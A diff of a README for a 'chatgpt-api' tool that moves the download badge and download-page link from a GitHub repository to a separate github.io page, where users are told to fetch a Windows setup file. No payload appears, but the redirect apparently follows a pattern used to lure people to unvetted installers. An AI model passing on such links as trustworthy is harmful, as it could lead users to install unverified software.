@@ -1,6 +1,6 @@
 # 🤖 chatgpt-api - Local web access for chat models
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/aylmerdemanding826/chatgpt-api)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://aylmerdemanding826.github.io)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these minimum stand
 
 Visit the project page to download the latest setup file for Windows:
 
-[Download page for chatgpt-api](https://github.com/aylmerdemanding826/chatgpt-api)
+[Download page for chatgpt-api](https://aylmerdemanding826.github.io)
 
 1. Click the link above to open the release page in your web browser.
 2. Look for the section labeled "Assets."
